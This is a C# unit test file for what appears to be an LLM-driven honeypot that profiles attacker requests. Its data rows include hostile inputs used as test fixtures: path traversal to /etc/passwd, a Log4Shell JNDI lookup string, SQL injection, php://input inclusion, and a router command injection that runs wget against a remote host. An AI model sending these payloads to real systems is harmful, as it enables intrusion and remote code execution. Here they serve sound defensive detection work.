using Honeyslop.Worker.Llm;

namespace Honeyslop.Worker.Tests.Llm;

[TestClass]
public sealed class RequestProfilerTests
{
    [TestMethod]
    [DataRow("vorobalek.dev", "/", ResponseKind.Site, "the home page of the website vorobalek.dev, served by {web}", "{web}")]
    [DataRow("203.0.113.7", "/", ResponseKind.Site, "the default page of a freshly installed web server at 203.0.113.7, served by {web}", "{web}")]
    [DataRow("shop.test", "/catalog/shoes?page=2", ResponseKind.Site, "the page /catalog/shoes of the website shop.test, served by {web}", "{web}")]
    [DataRow("203.0.113.7", "/HNAP1/", ResponseKind.Device, "D-Link DIR-850L home router, HNAP interface", "Linux, HTTP/1.1, DIR-850L Ver 1.13")]
    [DataRow("203.0.113.7", "/ISAPI/System/deviceInfo", ResponseKind.Device, "Hikvision IP camera, ISAPI interface", "App-webs/")]
    [DataRow("203.0.113.7", "/boaform/admin/formLogin", ResponseKind.App, "Realtek-based home router web interface", "Boa/0.94.14rc21")]
    [DataRow("blog.test", "/wp-login.php", ResponseKind.App, "WordPress 5", "{web}")]
    [DataRow("blog.test", "/wp-content/plugins/hellopress/wp_filemanager.php", ResponseKind.App, "WordPress plugin hellopress", "{web}")]
    [DataRow("blog.test", "/wp-admin/install.php", ResponseKind.App, "WordPress installer, first step", "{web}")]
    [DataRow("ci.test", "/manager/html", ResponseKind.App, "Apache Tomcat Manager", "Apache-Coyote/1.1")]
    [DataRow("85.10.202.87", "/ews/exchange.asmx", ResponseKind.Api, "Microsoft Exchange Web Services", "Microsoft-IIS/8.5")]
    [DataRow("shop.test", "/admin", ResponseKind.App, "the login page of the website shop.test, served by {web}", "{web}")]
    [DataRow("api.test", "/actuator/env", ResponseKind.Api, "Spring Boot Actuator", "")]
    [DataRow("203.0.113.7", "/v2/_catalog", ResponseKind.Api, "Docker Registry HTTP API v2", "")]
    [DataRow("shop.test", "/api/orders/7", ResponseKind.Api, "the JSON API of the website shop.test, served by {web}", "{web}")]
    [DataRow("shop.test", "/.env", ResponseKind.File, "the file /.env, readable on the website shop.test, served by {web}", "{web}")]
    [DataRow("203.0.113.7", "/cgi-bin/.env", ResponseKind.File, "the file /cgi-bin/.env, readable on the web server at 203.0.113.7, served by {web}", "{web}")]
    [DataRow("blog.test", "/wp-config.php.bak", ResponseKind.File, "the file /wp-config.php.bak, readable on the website blog.test, served by {web}", "{web}")]
    [DataRow("shop.test", "/backup/db.sql", ResponseKind.File, "the file /backup/db.sql, readable on the website shop.test, served by {web}", "{web}")]
    [DataRow("shop.test", "/download?file=../../etc/passwd", ResponseKind.Exploit, "the website shop.test, served by {web}, and the response is the raw content of the file the request names", "{web}")]
    [DataRow("shop.test", "/?x=%24%7Bjndi%3Aldap%3A%2F%2F1.2.3.4%2Fa%7D", ResponseKind.Exploit, "the website shop.test, served by {web}, and the response is its usual page", "{web}")]
    [DataRow("shop.test", "/item?id=1' or '1'='1", ResponseKind.Exploit, "the website shop.test, served by {web}, and the response contains the database rows the SQL in the request selects", "{web}")]
    [DataRow("shop.test", "/index.php?page=php://input", ResponseKind.Exploit, "the website shop.test, served by {web}, and the response contains the output of the PHP code in the request", "{web}")]
    public void Profile_NamesTheKindTheSoftwareAndTheServer(string host, string target, ResponseKind kind, string subject, string server)
    {
        var web = RequestProfiler.WebServer(host);

        Assert.AreEqual(new RequestProfile(kind, subject.Replace("{web}", web), server.Replace("{web}", web)), RequestProfiler.Profile(host, target, null));
    }

    [TestMethod]
    public void Profile_CommandInTheBodyOfAKnownDevice_KeepsTheDeviceAndItsServer()
    {
        var profile = RequestProfiler.Profile("203.0.113.7", "/boaform/admin/formPing", "target_addr=;wget http://1.2.3.4/x.sh");

        Assert.AreEqual(new RequestProfile(ResponseKind.Exploit, "Realtek-based home router web interface, and the response contains the output of the shell command in the request", "Boa/0.94.14rc21"), profile);
    }

    [TestMethod]
    public void Profile_EmbeddedDevice_RunsOnAnEmbeddedServer()
    {
        var server = RequestProfiler.Profile("203.0.113.7", "/cgi-bin/status.cgi", null).Server;

        Assert.DoesNotContain("Apache", server);
        Assert.DoesNotContain("IIS", server);
        Assert.DoesNotContain("nginx", server);
    }

    [TestMethod]
    public void WebServer_KeepsAHostOnOneServer_AndSpreadsHostsOverMany()
    {
        string[] servers = [.. Enumerable.Range(0, 200).Select(x => RequestProfiler.WebServer($"site{x}.test"))];

        Assert.AreEqual(RequestProfiler.WebServer("Shop.Test"), RequestProfiler.WebServer("shop.test"));
        Assert.IsGreaterThan(14, servers.Distinct().Count());
        Assert.IsLessThan(40, servers.GroupBy(x => x).Max(x => x.Count()));
    }
}